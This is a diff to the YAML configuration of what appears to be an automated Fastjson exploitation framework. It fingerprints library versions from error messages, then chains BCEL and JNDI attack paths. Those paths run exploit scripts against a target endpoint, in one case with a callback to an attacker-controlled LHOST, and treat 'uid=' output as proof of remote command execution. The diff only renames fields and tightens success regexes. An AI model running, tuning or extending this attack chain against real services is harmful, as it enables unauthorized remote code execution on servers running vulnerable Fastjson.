@@ -57,9 +57,9 @@ probes:
     timeout: 15
     parse_rules:
       - if_contains: ["autoType is not support", "safeMode"]
-        set: { fastjson_confirmed: true, autotype_blocked: true, version_hint: ">=1.2.68" }
+        set: { fastjson_confirmed: true, autotype_blocked: true, version_tier: "gte_1.2.68" }
       - if_contains: ["type not match", "typeMismatch", "ClassNotFoundException"]
-        set: { fastjson_confirmed: true, autotype_enabled: true, version_hint: "1.2.25~1.2.67" }
+        set: { fastjson_confirmed: true, autotype_enabled: true, version_tier: "mid_1.2.25_67" }
       - if_contains: ["com.alibaba.fastjson", "fastjson"]
         set: { fastjson_confirmed: true }
       - if_contains: ["HTTP_CODE:4", "HTTP_CODE:5"]
@@ -76,9 +76,9 @@ probes:
     timeout: 15
     parse_rules:
       - if_contains: ["JdbcRowSetImpl", "connection refused", "connect timed out"]
-        set: { bypass_47_works: true, version_range: "<=1.2.47" }
+        set: { bypass_47_works: true, version_tier: "lte_1.2.47" }
       - if_contains: ["autoType is not support", "deny"]
-        set: { bypass_47_works: false, version_range: ">=1.2.48" }
+        set: { bypass_47_works: false, version_tier: "gte_1.2.48" }
 
   - id: version_probe_24
     description: "测试直接 @type 是否可用（≤1.2.24）"
@@ -91,7 +91,7 @@ probes:
     timeout: 15
     parse_rules:
       - if_not_contains: ["error", "deny", "not support", "autoType"]
-        set: { direct_autotype: true, version_range: "<=1.2.24" }
+        set: { direct_autotype: true, version_tier: "lte_1.2.24" }
 
 # ───────────────────────────────────────────
 # 利用路径
@@ -114,7 +114,7 @@ exploit_paths:
         command: "python3 /opt/bcel_fastjson.py {ENDPOINT} id"
         timeout: 30
         success_criteria:
-          stdout_contains_any: ["uid=", "gid="]
+          stdout_regex: "uid=\\d+\\(\\w+\\)"
         on_success: bcel_whoami
         on_fail: next_path
 
@@ -146,7 +146,7 @@ exploit_paths:
         command: "/opt/jndi_fastjson.sh {ENDPOINT} {LHOST} id"
         timeout: 120
         success_criteria:
-          stdout_contains_any: ["uid=", "JNDI_RCE_SUCCESS"]
+          stdout_regex: "(uid=\\d+\\(\\w+\\)|JNDI_RCE_SUCCESS)"
         on_success: jndi_confirm
         on_fail: jndi_tomcat
 
@@ -162,7 +162,7 @@ exploit_paths:
             --max-time 15
         timeout: 120
         success_criteria:
-          stdout_contains_any: ["uid=", "JNDI_RCE_SUCCESS"]
+          stdout_regex: "(uid=\\d+\\(\\w+\\)|JNDI_RCE_SUCCESS)"
         on_success: jndi_confirm
         on_fail: next_path
 
@@ -204,7 +204,7 @@ exploit_paths:
           fi
         timeout: 20
         success_criteria:
-          stdout_contains_any: ["uid="]
+          stdout_regex: "uid=\\d+\\(\\w+\\)"
         on_success: conclude_success
         on_fail: next_step
 
@@ -235,7 +235,7 @@ exploit_paths:
           fi
         timeout: 15
         success_criteria:
-          stdout_contains_any: ["uid=", "JNDI_CONNECT"]
+          stdout_regex: "(uid=\\d+\\(\\w+\\)|JNDI_CONNECT)"
         on_success: conclude_success
         on_fail: next_path
 
